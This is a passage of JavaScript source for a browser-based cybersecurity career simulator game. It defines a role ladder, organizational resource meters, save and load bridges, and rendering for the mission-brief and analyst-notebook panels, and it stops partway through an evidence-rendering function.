/*
 * sim.js — Cybersecurity Career Simulator (prototype, role-based)
 *
 * A clean REBUILD of the investigation flow as a role-based career simulator.
 * It lives ALONGSIDE the existing Operations Center home (#opsCenter) and the
 * legacy experimental interiors (holotable / console / lab) WITHOUT replacing
 * them. Career missions open their own four-panel "Operating Center" screen
 * (#careerOps) via a window bridge, mirroring the lab.js bridge pattern.
 *
 * Architecture (future-ready by design — see attached career-sim master spec):
 *   - ROLE engine        : 7-role ladder as config; only Cybersecurity Intern
 *                          is active. Authority booleans + allowedActions gate
 *                          what the player may do; future roles unlock more.
 *   - RESOURCE engine    : six organizational resources, always visible in a
 *                          top resource bar, persisted in localStorage.
 *   - INVESTIGATION engine (P2) : terminal (ls/cat/less) reveals evidence;
 *                          reward is investigation quality, not command usage.
 *   - DECISION engine (P3)      : every decision moves >=3 resources + flags.
 *   - CONSEQUENCE engine (P3)   : Immediate / Business / Resource / Future.
 *   - RECOMMENDATION engine (P3): Approved / Denied / Deferred / Partial.
 *   - CAREER engine (P4)        : rank derived; mission report + carry-forward.
 *
 * The engine is GENERIC: all mission content lives in CAREER_MISSIONS[id] and is
 * selected into SIM.def on open. Adding a mission = adding a dataset, not code.
 *
 * SHIPPING INTEGRATION (de-prototyped):
 *   - Career state is read/written through the host bridges window.echCareerLoad /
 *     window.echCareerSave (defined in script.js). Those persist it inside the
 *     shipping save "ech.progress.v1" under the additive `career` key, via the
 *     saveProgress() chokepoint (which also enqueues the best-effort Supabase
 *     mirror). CAREER_STORE_KEY ('ocp.career.v1') is now only a STANDALONE
 *     fallback used when no host bridge is present (prototype / tests).
 *   - No quiz / flashcard / lesson / command-memo engine. No correct=+X scoring.
 */

/* ================================================================== *
 * ROLE ENGINE — 7-role ladder (config only; future-ready)
 * ------------------------------------------------------------------ *
 * Only `cybersecurity_intern` is ACTIVE. Future roles exist purely as
 * configuration so the resource/decision/recommendation engines can later
 * unlock authority without a redesign. Permission booleans + allowedActions
 * are what the Operating Center reads — never a hard-coded role id.
 * ================================================================== */
import {
  activeConditions,
  buildEffectiveDef,
  dynamicDeltaMods,
  mergeDeltas,
  continuityLines,
  outcomeNotes,
  supervisorMemoryLines,
  upsertCompanyHistory,
  companyTimeline,
} from './career-dynamic.js';

const CAREER_ROLES = [
  {
    id: 'cybersecurity_intern',
    title: 'Cybersecurity Intern',
    department: 'Security Operations',
    authorityLevel: 1,
    active: true,
    canViewBudget: true,
    canAffectBudget: true,
    canRecommend: true,
    canEscalate: true,
    canRequestBudget: false,
    canApproveBudget: false,
    canPurchaseTools: false,
    canChangePolicy: false,
    canHireConsultants: false,
    canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document'],
  },
  { id: 'junior_soc_analyst',   title: 'Junior SOC Analyst',           department: 'Security Operations', authorityLevel: 2, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: false, canPurchaseTools: false, canChangePolicy: false,
    canHireConsultants: false, canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document', 'contain'] },
  { id: 'soc_analyst',          title: 'SOC Analyst',                  department: 'Security Operations', authorityLevel: 3, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: false, canPurchaseTools: false, canChangePolicy: false,
    canHireConsultants: false, canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document', 'contain', 'correlate'] },
  { id: 'senior_security_analyst', title: 'Senior Security Analyst',   department: 'Security Operations', authorityLevel: 4, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: false, canPurchaseTools: true, canChangePolicy: false,
    canHireConsultants: false, canEngageExecutives: false,
    allowedActions: ['investigate', 'classify', 'recommend', 'escalate', 'document', 'contain', 'correlate', 'mentor'] },
  { id: 'security_manager',     title: 'Security Manager',             department: 'Security Leadership',  authorityLevel: 5, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: true, canPurchaseTools: true, canChangePolicy: true,
    canHireConsultants: true, canEngageExecutives: false,
    allowedActions: ['investigate', 'recommend', 'escalate', 'approve', 'purchase', 'set_policy', 'manage_team'] },
  { id: 'director_cybersecurity', title: 'Director of Cybersecurity',  department: 'Security Leadership',  authorityLevel: 6, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: true, canPurchaseTools: true, canChangePolicy: true,
    canHireConsultants: true, canEngageExecutives: true,
    allowedActions: ['approve', 'purchase', 'set_policy', 'manage_program', 'engage_executives', 'manage_vendors'] },
  { id: 'ciso',                 title: 'Chief Information Security Officer', department: 'Executive',      authorityLevel: 7, active: false,
    canViewBudget: true, canAffectBudget: true, canRecommend: true, canEscalate: true,
    canRequestBudget: true, canApproveBudget: true, canPurchaseTools: true, canChangePolicy: true,
    canHireConsultants: true, canEngageExecutives: true,
    allowedActions: ['set_strategy', 'approve', 'engage_board', 'manage_program', 'engage_executives', 'manage_vendors'] },
];

function roleById(id) { return CAREER_ROLES.find(r => r.id === id) || CAREER_ROLES[0]; }
function activeRole() { return roleById(CAREER.currentRole); }

const ACTION_LABELS = {
  investigate: 'Investigate', classify: 'Classify', recommend: 'Recommend',
  escalate: 'Escalate', document: 'Document', contain: 'Contain',
  correlate: 'Correlate', mentor: 'Mentor', approve: 'Approve',
  purchase: 'Purchase', set_policy: 'Set Policy', manage_team: 'Manage Team',
  manage_program: 'Manage Program', engage_executives: 'Engage Executives',
  manage_vendors: 'Manage Vendors', set_strategy: 'Set Strategy',
  engage_board: 'Engage Board',
};
function actionLabel(a) { return ACTION_LABELS[a] || a; }

/* ================================================================== *
 * RESOURCE ENGINE — six organizational resources + persistence
 * ================================================================== */
const RESOURCE_DEFS = [
  { key: 'securityPosture',    label: 'Security Posture',    kind: 'pct',   higherBetter: true  },
  { key: 'organizationBudget', label: 'Organization Budget', kind: 'money', higherBetter: true  },
  { key: 'executiveTrust',     label: 'Executive Trust',     kind: 'pct',   higherBetter: true  },
  { key: 'complianceExposure', label: 'Compliance Exposure', kind: 'pct',   higherBetter: false },
  { key: 'careerReputation',   label: 'Career Reputation',   kind: 'pct',   higherBetter: true  },
  { key: 'businessContinuity', label: 'Business Continuity', kind: 'pct',   higherBetter: true  },
];

const CAREER_SCHEMA_VERSION = 1;

const CAREER_DEFAULTS = {
  schemaVersion: CAREER_SCHEMA_VERSION,
  securityPosture: 72,
  organizationBudget: 50000,
  executiveTrust: 75,
  complianceExposure: 0,
  careerReputation: 0,
  businessContinuity: 85,
  currentRole: 'cybersecurity_intern',
  currentRank: 'Cybersecurity Intern',
  evidenceView: 'beginner',   // 'beginner' | 'analyst' — presentation only
  missionFlags: {},
  completedMissions: [],
  companyHistory: {},         // {missionId: outcome record} — the company timeline
  updatedAt: null,            // ms epoch of last persisted save (stamped on save)
};

const CAREER_STORE_KEY = 'ocp.career.v1';

/* Persistent career state. Authoritative for the resource bar and the sim.
 * Kept fully separate from the legacy getCareerState() reads in oc.js. */
let CAREER = loadCareerState();

function clampResource(key, val) {
  const def = RESOURCE_DEFS.find(d => d.key === key);
  let n = Number(val);
  if (!Number.isFinite(n)) n = CAREER_DEFAULTS[key];
  if (def && def.kind === 'money') return Math.max(0, Math.round(n));
  return Math.max(0, Math.min(100, Math.round(n)));
}

function loadCareerState() {
  const base = { ...CAREER_DEFAULTS, missionFlags: {}, completedMissions: [], companyHistory: {} };
  try {
    // Shipping integration: career state lives in ech.progress.v1 (progress.career),
    // read through the host bridge. Standalone (no host) falls back to its own key.
    let saved;
    if (typeof window !== 'undefined' && typeof window.echCareerLoad === 'function') {
      saved = window.echCareerLoad();
    } else {
      const raw = localStorage.getItem(CAREER_STORE_KEY);
      saved = raw ? JSON.parse(raw) : null;
    }
    if (!saved || typeof saved !== 'object') return base;
    RESOURCE_DEFS.forEach(d => {
      base[d.key] = clampResource(d.key, saved[d.key] != null ? saved[d.key] : base[d.key]);
    });
    if (typeof saved.currentRole === 'string' && CAREER_ROLES.some(r => r.id === saved.currentRole)) {
      base.currentRole = saved.currentRole;
    }
    base.currentRank = roleById(base.currentRole).title;
    if (saved.evidenceView === 'analyst' || saved.evidenceView === 'beginner') {
      base.evidenceView = saved.evidenceView;
    }
    if (saved.missionFlags && typeof saved.missionFlags === 'object') {
      base.missionFlags = { ...saved.missionFlags };
    }
    if (Array.isArray(saved.completedMissions)) {
      base.completedMissions = saved.completedMissions.filter(m => typeof m === 'string');
    }
    if (saved.companyHistory && typeof saved.companyHistory === 'object') {
      base.companyHistory = { ...saved.companyHistory };
    }
    // schemaVersion stays at the current code version (any future migration would
    // branch on saved.schemaVersion here). Preserve the last-saved timestamp.
    if (typeof saved.updatedAt === 'number') base.updatedAt = saved.updatedAt;
    return base;
  } catch (_) {
    return base;
  }
}

function saveCareerState() {
  try {
    // Stamp schema version + save time so the persisted blob is self-describing
    // (future migrations branch on schemaVersion in loadCareerState).
    CAREER.schemaVersion = CAREER_SCHEMA_VERSION;
    CAREER.updatedAt = Date.now();
    // Shipping integration: persist ONLY through the host saveProgress() chokepoint
    // (it also enqueues the best-effort Supabase mirror). Standalone falls back to
    // career-sim's own localStorage key.
    if (typeof window !== 'undefined' && typeof window.echCareerSave === 'function') {
      window.echCareerSave(CAREER);
      return;
    }
    localStorage.setItem(CAREER_STORE_KEY, JSON.stringify(CAREER));
  } catch (_) { /* storage unavailable — stay in-memory, never throw */ }
}

function resetCareerStateInMemory() {
  CAREER = { ...CAREER_DEFAULTS, missionFlags: {}, completedMissions: [], companyHistory: {} };
  renderResourceBar();
}
function resetCareerState() {
  resetCareerStateInMemory();
  saveCareerState();
}
// Host "Clear Progress" resets the in-memory career state WITHOUT persisting
// (the host wipes ech.progress.v1 separately and leaves storage empty).
if (typeof window !== 'undefined') window.echCareerResetInMemory = resetCareerStateInMemory;

/* Apply a map of resource deltas (e.g. {securityPosture:-25, executiveTrust:-20}),
 * clamp, persist, and refresh the bar. Returns the before/after for each key so
 * the consequence engine can show exact changes. */
function applyResourceDeltas(deltas) {
  const changes = [];
  Object.keys(deltas || {}).forEach(key => {
    if (!RESOURCE_DEFS.some(d => d.key === key)) return;
    const before = CAREER[key];
    const after = clampResource(key, before + Number(deltas[key] || 0));
    CAREER[key] = after;
    changes.push({ key, before, after, requested: Number(deltas[key] || 0) });
  });
  saveCareerState();
  renderResourceBar();
  return changes;
}

function setMissionFlag(flag, value = true) {
  if (!flag) return;
  CAREER.missionFlags[flag] = value;
  saveCareerState();
}

function formatResource(key, val) {
  const def = RESOURCE_DEFS.find(d => d.key === key);
  if (def && def.kind === 'money') return '$' + Number(val).toLocaleString('en-US');
  return String(val);
}

/* ================================================================== *
 * RESOURCE BAR — always visible at the top of home AND mission screens
 * ------------------------------------------------------------------ *
 * Per-screen duplicated bar: one render fills every `.sim-resbar` host
 * (avoids a global app-shell refactor that would touch the 5 shared
 * .screen layouts). Empty static hosts live in index.html.
 * ================================================================== */
function renderResourceBar() {
  const role = activeRole();
  const authority = role.allowedActions.map(actionLabel).join(' · ');
  const resourceCells = RESOURCE_DEFS.map(d => {
    const val = CAREER[d.key];
    const tone = resourceTone(d, val);
    const meter = d.kind === 'pct'
      ? `<span class="sim-res-meter"><span class="sim-res-meter-fill sim-res-${tone}" style="width:${val}%"></span></span>`
      : '';
    return `
      <div class="sim-res sim-res--${tone}" title="${d.label}">
        <span class="sim-res-label">${d.label}</span>
        <span class="sim-res-val" data-res="${d.key}">${formatResource(d.key, val)}</span>
        ${meter}
      </div>`;
  }).join('');

  const html = `
    <div class="sim-resbar-role">
      <span class="sim-resbar-role-tag">ROLE</span>
      <span class="sim-resbar-role-name">${role.title}</span>
      <span class="sim-resbar-auth"><span class="sim-resbar-auth-tag">AUTHORITY</span> ${authority}</span>
    </div>
    <div class="sim-resbar-resources">${resourceCells}</div>`;

  document.querySelectorAll('.sim-resbar').forEach(bar => { bar.innerHTML = html; });
}

// Host bridge: the shipping OCV2 home re-renders through renderOperationsCenter(),
// which calls this to (re)fill the home's .sim-resbar host with current resources.
if (typeof window !== 'undefined') window.echCareerRenderResourceBar = renderResourceBar;

/* Tone for color coding: pct resources use higherBetter to flip the scale;
 * money is neutral-to-warn as it depletes. Presentation only. */
function resourceTone(def, val) {
  if (def.kind === 'money') {
    if (val <= 10000) return 'bad';
    if (val <= 30000) return 'warn';
    return 'good';
  }
  const good = def.higherBetter ? val >= 70 : val <= 25;
  const warn = def.higherBetter ? val >= 40 : val <= 55;
  if (good) return 'good';
  if (warn) return 'warn';
  return 'bad';
}

/* ================================================================== *
 * OPERATING CENTER — four-panel mission screen (#careerOps)
 * ------------------------------------------------------------------ *
 * SIM holds the live engine state; SIM.def is the active mission dataset.
 * P2–P4 populate the Evidence / Terminal+Action / Feedback panels.
 * ================================================================== */
const SIM = {
  missionId: null,
  def: null,
  stage: 'investigation',   // investigation -> decision -> report
  listed: false,            // `ls` has been run
  read: new Set(),          // files cat/less'd
  ranCommands: new Set(),   // command ids run (command-model missions)
  evidence: new Set(),      // evidence ids surfaced
  classified: {},           // fileName -> classification value
  identified: null,         // chosen identify option id (command-model missions)
  decision: null,           // chosen action id
  recommendations: [],      // submitted recommendation results
  evReveal: {},             // evidenceId -> 'analyst' | 'technical' (per-item disclosure)
  reflection: { concerns: new Set(), judgment: null }, // suspicious-activity reasoning (ungraded)
  runToken: 0,              // invalidates stray timers across opens
  mapOpen: false,           // network-map overlay visibility (transient, presentation-only)
  dynamic: [],              // active dynamic conditions for this mission (carry-flag driven)
};

function careerMission() { return SIM.def; }

/* Per-mission terminal hint. Command-model missions (def.commands[]) define their
 * own verbs, so `ls`/`cat <file>` return "command not found" there — suggest the
 * mission's real starting command instead. File-model missions keep the ls/cat hint. */
function simTermPlaceholder(def) {
  if (def && Array.isArray(def.commands) && def.commands.length) {
    const first = def.commands.find(c => c.core) || def.commands[0];
    const start = first && first.match && first.match[0];
    return start
      ? 'type a command — try `' + start + '`, or `help`'
      : 'type a command — try `help`';
  }
  return 'type a command — try `ls`, then `cat <file>`, or `help`';
}

function openCareerMission(missionId) {
  const def = CAREER_MISSIONS[missionId];
  if (!def) return;

  SIM.runToken++;
  SIM.missionId = missionId;
  // Dynamic conditions: read prior-mission carry-flags and additively reshape
  // this mission (evidence / commands / risks / brief continuity / outcome).
  // Pure + non-mutating — the canonical def in CAREER_MISSIONS is never changed.
  SIM.dynamic = activeConditions(def.dynamicConditions, CAREER.missionFlags);
  SIM.def = buildEffectiveDef(def, SIM.dynamic);
  SIM.stage = 'investigation';
  SIM.listed = false;
  SIM.read = new Set();
  SIM.ranCommands = new Set();
  SIM.evidence = new Set();
  SIM.classified = {};
  SIM.identified = null;
  SIM.decision = null;
  SIM.recommendations = [];
  SIM.evReveal = {};
  SIM.reflection = { concerns: new Set(), judgment: null };

  // Network-map overlay is review-only + transient: never carries across missions.
  SIM.mapOpen = false;
  if (simMapEl) simMapEl.hidden = true;
  simMapIntelHide();
  updateMapButton();

  enterCareerScreen();

  const promptEl = document.getElementById('simTermPrompt');
  if (promptEl) promptEl.textContent = def.promptLabel || 'intern@cybercorp:~/release$';

  renderResourceBar();
  renderCareerHeader();
  renderBriefPanel();
  renderEvidencePanel();
  renderTerminalPanel();
  renderFeedbackPanel();

  const input = document.getElementById('simTermInput');
  if (input) {
    input.placeholder = simTermPlaceholder(def);
    setTimeout(() => input.focus(), 50);
  }
}

function returnFromCareerMission() {
  SIM.runToken++;
  exitCareerScreen();
  renderResourceBar();
}

/* ------------------------------------------------------------------ *
 * Screen bridge (shipping integration)
 * career-sim.js is an isolated ES module loaded alongside script.js. The host
 * app exposes window.echEnterCareerScreen / window.echExitCareerScreen to swap
 * the Operations Center home (#moduleLanding) and the Career Operating Center
 * (#careerOps) while preserving the shipping site chrome and re-rendering the
 * Operations Center on return. We fall back to direct DOM toggling
 * (#opsCenter / #careerOps) so the module still works standalone (tests).
 * ------------------------------------------------------------------ */
function enterCareerScreen() {
  if (typeof window.echEnterCareerScreen === 'function') { window.echEnterCareerScreen(); return; }
  const o = document.getElementById('opsCenter'); if (o) o.style.display = 'none';
  const c = document.getElementById('careerOps'); if (c) c.style.display = 'flex';
}
function exitCareerScreen() {
  if (typeof window.echExitCareerScreen === 'function') { window.echExitCareerScreen(); return; }
  const c = document.getElementById('careerOps'); if (c) c.style.display = 'none';
  const o = document.getElementById('opsCenter'); if (o) o.style.display = 'flex';
}
function careerScreenOpen() {
  const c = document.getElementById('careerOps');
  return !!c && c.style.display !== 'none';
}

window.openCareerMission = openCareerMission;
// Shipping integration: lets the host (script.js launchMissionFromMap) decide —
// without hardcoding ids — whether an assignment opens the career-sim interior.
// Evaluated lazily at call time (long after module eval), so referencing
// CAREER_MISSIONS (defined later) is safe, mirroring openCareerMission itself.
window.echCareerHasMission = function echCareerHasMission(id) {
  return !!CAREER_MISSIONS[id];
};
window.CAREER_MISSION_IDS = []; // populated after CAREER_MISSIONS is defined

/* ------------------------------------------------------------------ *
 * Header strip
 * ------------------------------------------------------------------ */
function renderCareerHeader() {
  const def = SIM.def;
  if (!def) return;
  const sev = document.getElementById('careerSeverity');
  const region = document.getElementById('careerRegion');
  const title = document.getElementById('careerTitle');
  if (sev) { sev.textContent = def.severity; sev.setAttribute('data-severity', def.severity); }
  if (region) region.textContent = def.region;
  if (title) title.textContent = def.title;
}

/* ------------------------------------------------------------------ *
 * Panel 1 — Mission Brief
 * ------------------------------------------------------------------ */
function renderBriefPanel() {
  const def = SIM.def;
  const host = document.getElementById('simBrief');
  if (!host || !def) return;
  const b = def.brief || {};
  const objectives = (b.objectives || [])
    .map(o => `<li class="sim-brief-obj"><span class="sim-brief-obj-icon" aria-hidden="true">○</span><span>${o}</span></li>`)
    .join('');
  // CASE CONTINUITY — present only when prior-mission carry-flags activated a
  // dynamic condition. Shows the analyst exactly which earlier decision is
  // shaping this case before they touch the terminal.
  const contLines = continuityLines(SIM.dynamic);
  const continuityHtml = contLines.length ? `
      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">CASE CONTINUITY</div>
      <ul class="sim-cont-list">
        ${contLines.map(l => `
        <li class="sim-cont-item sim-cont-item--${l.tone}">
          <div class="sim-cont-from">${l.from}</div>
          <div class="sim-cont-decision">${l.decision}</div>
          <div class="sim-cont-consequence">${l.consequence}</div>
        </li>`).join('')}
      </ul>` : '';
  // SUPERVISOR — CASE MEMORY: adaptive Sarah Reyes lines keyed on carry-flags
  // from earlier cases (good catch / missed thread / over-or-under-escalation).
  // Data-gated on def.supervisorMemory, so Mission 1 (no prior context) shows none.
  const memLines = supervisorMemoryLines(def.supervisorMemory, CAREER.missionFlags);
  const memHtml = memLines.length ? `
      <ul class="sim-supmem-list">
        ${memLines.map(l => `<li class="sim-supmem-item sim-supmem-item--${l.tone}"><span class="sim-supmem-mark" aria-hidden="true"></span><span>${l.text}</span></li>`).join('')}
      </ul>` : '';
  // COMPANY TIMELINE — every prior case you closed, in order, so the brief shows
  // "the company remembers". Grows across the arc; excludes the current mission.
  const history = companyTimeline(CAREER.companyHistory, SIM.missionId, Object.keys(CAREER_MISSIONS));
  const timelineHtml = history.length ? `
      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">COMPANY TIMELINE</div>
      <ol class="sim-timeline-list">
        ${history.map(timelineItemHtml).join('')}
      </ol>` : '';
  host.innerHTML = `
    <div class="sim-panel-head">MISSION BRIEF</div>
    <div class="sim-brief-body">
      <div class="sim-brief-row"><span class="sim-brief-key">OPERATION ID</span><span class="sim-brief-v">${def.opId}</span></div>
      <div class="sim-brief-row"><span class="sim-brief-key">CURRICULUM</span><span class="sim-brief-v">${def.threatClass}</span></div>
      <div class="sim-brief-row"><span class="sim-brief-key">PRIORITY</span><span class="sim-brief-v sim-brief-v--alert">${def.priority}</span></div>
      <div class="sim-brief-row"><span class="sim-brief-key">ROLE</span><span class="sim-brief-v">${activeRole().title}</span></div>

      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">SITUATION</div>
      <p class="sim-brief-text">${b.situation || ''}</p>

      <div class="sim-brief-section-label">OBJECTIVES</div>
      <ul class="sim-brief-objs">${objectives}</ul>

      <div class="sim-brief-divider"></div>
      <div class="sim-brief-section-label">SUPERVISOR NOTE</div>
      <p class="sim-brief-note">${b.managerNote || ''}</p>
      ${memHtml}
      ${timelineHtml}
      ${continuityHtml}
    </div>`;
}

/* One COMPANY TIMELINE entry on the brief: the case, the call you made (with the
 * leadership verdict where there was one), and the single biggest resource move
 * it caused. Presentation-only; reads a persisted history record. */
function timelineItemHtml(t) {
  const moves = (Array.isArray(t.resourceChanges) ? t.resourceChanges.slice() : [])
    .sort((a, b) => Math.abs(b.delta) - Math.abs(a.delta));
  const top = moves[0];
  let impact = '';
  if (top) {
    const d = RESOURCE_DEFS.find(r => r.key === top.key);
    if (d) {
      const diff = top.delta;
      const disp = d.kind === 'money'
        ? (diff >= 0 ? '+' : '−') + '$' + Math.abs(diff).toLocaleString('en-US')
        : (diff > 0 ? '+' : '') + diff;
      const dir = diff > 0 ? 'up' : diff < 0 ? 'down' : 'flat';
      impact = `<span class="sim-timeline-impact sim-timeline-impact--${dir}">${d.label} ${disp}</span>`;
    }
  }
  const decision = t.decisionLabel
    ? `${t.decisionLabel}${t.verdict ? ' — ' + t.verdict : ''}`
    : (t.verdict || 'Resolved');
  return `
    <li class="sim-timeline-item">
      <div class="sim-timeline-op">${t.opId || ''} · ${t.title || t.missionId}</div>
      <div class="sim-timeline-decision">${decision}</div>
      ${impact}
    </li>`;
}

/* ------------------------------------------------------------------ *
 * Panel 2 — Evidence + file classification (INVESTIGATION engine, P2)
 * ------------------------------------------------------------------ */
/* Investigation confidence (0..100) — a presentation-only mirror of evidence
 * quality. Starts at 10 (you always know *something*) and climbs to 100 as the
 * weighted evidence is surfaced. Touches no scoring; the recommendation engine
 * still reads evidenceQuality()/classificationQuality() directly. */
function investigationConfidence() {
  return Math.max(10, Math.min(100, Math.round(10 + 90 * evidenceQuality())));
}

function confidenceMeterHtml() {
  const c = investigationConfidence();
  const tone = c >= 70 ? 'good' : c >= 40 ? 'warn' : 'low';
  return `
    <div class="sim-confidence sim-confidence--${tone}">
      <div class="sim-confidence-head"><span>INVESTIGATION CONFIDENCE</span><span class="sim-confidence-pct">${c}%</span></div>
      <div class="sim-confidence-meter"><span class="sim-confidence-fill" style="width:${c}%"></span></div>
      <div class="sim-confidence-note">Climbs as your commands uncover evidence.</div>
    </div>`;
}

/* A risk is "confirmed" once any evidence item that proves it has surfaced. */
function riskConfirmed(r) {
  return (r.triggeredBy || []).some(id => SIM.evidence.has(id));
}

function risksNotebookHtml() {
  const risks = (SIM.def && SIM.def.risks) || [];
  if (!risks.length) return '';
  const found = risks.filter(riskConfirmed).length;
  const items = risks.map(r => {
    const on = riskConfirmed(r);
    return `<li class="sim-risk${on ? ' sim-risk--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${r.label}</span></li>`;
  }).join('');
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head">POTENTIAL RISKS <span class="sim-notebook-count">${found}/${risks.length}</span></div>
      <ul class="sim-risks">${items}</ul>
    </div>`;
}

/* WORKING HYPOTHESES + OPEN QUESTIONS — additive analyst-notebook sections that
 * react to surfaced evidence the same way risks do. Data-gated on def.notebook:
 *   hypotheses:[{label, triggeredBy:[evId]}]  → "SUPPORTED" once any evidence hits
 *   unknowns:[{label, resolvedBy:[evId]}]     → checked off as evidence resolves them
 * Presentation-only (reads SIM.evidence); absent def.notebook → renders nothing. */
function notebookExtrasHtml() {
  const nb = (SIM.def && SIM.def.notebook) || null;
  if (!nb) return '';
  let html = '';
  const hyp = Array.isArray(nb.hypotheses) ? nb.hypotheses : [];
  if (hyp.length) {
    const supported = h => (h.triggeredBy || []).some(id => SIM.evidence.has(id));
    const count = hyp.filter(supported).length;
    const items = hyp.map(h => {
      const on = supported(h);
      return `<li class="sim-hyp${on ? ' sim-hyp--on' : ''}"><span class="sim-hyp-tag">${on ? 'SUPPORTED' : 'OPEN'}</span><span>${h.label}</span></li>`;
    }).join('');
    html += `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head">WORKING HYPOTHESES <span class="sim-notebook-count">${count}/${hyp.length}</span></div>
      <ul class="sim-hyps">${items}</ul>
    </div>`;
  }
  const unk = Array.isArray(nb.unknowns) ? nb.unknowns : [];
  if (unk.length) {
    const resolved = u => (u.resolvedBy || []).some(id => SIM.evidence.has(id));
    const open = unk.filter(u => !resolved(u)).length;
    const items = unk.map(u => {
      const on = resolved(u);
      return `<li class="sim-unknown${on ? ' sim-unknown--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${u.label}</span></li>`;
    }).join('');
    html += `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head">OPEN QUESTIONS <span class="sim-notebook-count">${open} open</span></div>
      <ul class="sim-unknowns">${items}</ul>
    </div>`;
  }
  return html;
}

/* The single "what is this?" determination for command-model missions. Single
 * select; correctness is NOT shown live (no quiz feel) — it surfaces only in the
 * debrief's identification review and feeds the recommendation outcome there. */
function identifyNotebookHtml() {
  const idf = SIM.def && SIM.def.identify;
  if (!idf) return '';
  if (SIM.evidence.size === 0) return '';   // nothing to reason about yet
  const opts = (idf.options || []).map(o => {
    const on = SIM.identified === o.id;
    return `<button type="button" class="sim-identify-btn${on ? ' sim-identify-btn--on' : ''}" data-identify="${o.id}" aria-pressed="${on}">${o.label}</button>`;
  }).join('');
  const note = SIM.identified
    ? `<div class="sim-identify-note">${idf.note || 'Determination recorded — this feeds the strength of your recommendation.'}</div>`
    : '';
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head">${idf.head || 'YOUR DETERMINATION'}</div>
      <div class="sim-identify-prompt">${idf.prompt || ''}</div>
      <div class="sim-identify-opts">${opts}</div>
      ${note}
    </div>`;
}

/* Response checklist line: □ until a decision/recommendation is recorded, then
 * ☑ with the chosen action. Presentation-only mirror of SIM.decision. */
function responseStatusHtml() {
  const d = SIM.decision;
  let label = 'Recommend or take a response action';
  if (d) {
    let chosen = '';
    if (d.actionId) {
      const a = (SIM.def.actions || []).find(x => x.id === d.actionId);
      chosen = a ? a.label : d.actionId;
    } else if (d.recommendationId) {
      const rc = (SIM.def.recommendations || {})[d.recommendationId];
      chosen = rc ? rc.label : d.recommendationId;
    }
    label = chosen ? ('Response recorded — ' + chosen) : 'Response recorded';
  }
  const on = !!d;
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head">RECOMMENDED RESPONSE</div>
      <ul class="sim-risks">
        <li class="sim-risk${on ? ' sim-risk--on' : ''}"><span class="sim-risk-box" aria-hidden="true">${on ? '☑' : '☐'}</span><span>${label}</span></li>
      </ul>
    </div>`;
}

function renderEvidencePanel() {
  const host = document.getElementById('simEvidence');
  if (!host) return;

  const mode = evidenceView();

  // Global Beginner / Analyst view toggle (Beginner is the default).
  const viewbar = `
    <div class="sim-ev-viewbar">
      <span class="sim-ev-viewbar-label">EVIDENCE VIEW</span>
      <div class="sim-ev-viewtoggle" role="group" aria-label="Evidence view mode">
        <button type="button" class="sim-ev-viewbtn${mode === 'beginner' ? ' sim-ev-viewbtn--on' : ''}" data-ev-view="beginner" aria-pressed="${mode === 'beginner'}">Beginner</button>
        <button type="button" class="sim-ev-viewbtn${mode === 'analyst' ? ' sim-ev-viewbtn--on' : ''}" data-ev-view="analyst" aria-pressed="${mode === 'analyst'}">Analyst</button>
      </div>
    </div>`;

  const evItems = simEvidenceDefs()
    .filter(e => SIM.evidence.has(e.id))
    .map(e => renderEvItem(e, mode))
    .join('');
  const emptyMsg = (SIM.def && SIM.def.evidenceEmpty) ||
    'No evidence yet. Use the terminal to investigate — each command can surface new findings.';
  const evSection = `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head">EVIDENCE COLLECTED <span class="sim-notebook-count">${SIM.evidence.size}</span></div>
      ${evItems || `<p class="sim-empty">${emptyMsg}</p>`}
    </div>`;

  // "What concerns you?" reasoning step — appears once the suspicious activity
  // it belongs to has been surfaced. Reasoning practice, never graded.
  const reflectEv = activeReflectionEv();
  const reflectHtml = reflectEv ? reflectionCardHtml(reflectEv) : '';

  const classHtml = renderClassifyHtml(mode);    // M1 file flow ('' for command-model)
  const identifyHtml = identifyNotebookHtml();    // command-model ('' for M1)

  host.innerHTML = `
    <div class="sim-panel-head">ANALYST NOTEBOOK</div>
    <div class="sim-evidence-body">
      ${confidenceMeterHtml()}
      ${viewbar}
      ${evSection}
      ${risksNotebookHtml()}
      ${notebookExtrasHtml()}
      ${reflectHtml}
      ${classHtml}
      ${identifyHtml}
      ${responseStatusHtml()}
    </div>`;
}

/* One evidence item, presented at the active depth. Beginner mode leads with
 * plain language + why-it-matters + a reasoning prompt, then discloses Analyst
 * Notes and Technical Details on demand. Analyst mode leads with the analyst
 * observation and discloses Technical Details. Per-item reveal state lives in
 * SIM.evReveal so it survives the panel's full re-renders. */
function renderEvItem(e, mode) {
  const tier = e.qualityWeight >= 3 ? 'KEY' : e.qualityWeight === 2 ? 'NOTABLE' : 'MINOR';
  const L = evLayers(e);
  const reveal = SIM.evReveal[e.id]; // undefined | 'analyst' | 'technical'

  let body = '';
  let control = '';

  if (mode === 'beginner') {
    body += `<div class="sim-ev-plain">${L.beginner.summary}</div>`;
    if (L.beginner.why) body += `<div class="sim-ev-why"><span class="sim-ev-why-label">Why it matters</span>${L.beginner.why}</div>`;
